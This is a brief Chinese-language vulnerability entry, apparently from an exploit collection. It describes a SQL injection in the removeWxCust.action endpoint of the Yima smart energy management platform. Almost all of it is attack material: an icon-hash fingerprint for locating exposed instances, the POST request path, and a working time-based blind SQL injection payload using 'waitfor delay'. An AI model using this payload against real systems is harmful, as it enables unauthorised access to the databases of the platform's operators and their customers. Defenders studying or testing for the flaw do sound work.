# 亿玛智慧能源管理平台removeWxCust存在SQL注入漏洞

亿玛智慧能源管理平台 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-53758288"`
- **请求**：`POST /life/removeWxCust.action HTTP/1.1`

**Payload**
```
userId=-1';waitfor delay '0:0:5'--=+qs
```
- **响应特征**：200